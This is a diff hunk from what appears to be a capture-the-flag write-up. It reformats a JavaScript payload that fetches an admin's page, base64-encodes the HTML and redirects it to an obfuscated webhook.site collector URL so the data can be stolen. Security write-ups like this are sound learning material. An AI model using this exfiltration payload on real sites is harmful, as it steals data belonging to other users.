@@ -83,10 +83,7 @@ Now it's time to prepare a JS script which will steal the admin decodings. Remem
 fetch("/")
   ["then"]((data) => data["text"]())
   ["then"](
-    (html) =>
-      (location =
-        atob("aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=") +
-        btoa(html))
+    (html) => (location = atob("aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=") + btoa(html))
   );
 ```
 
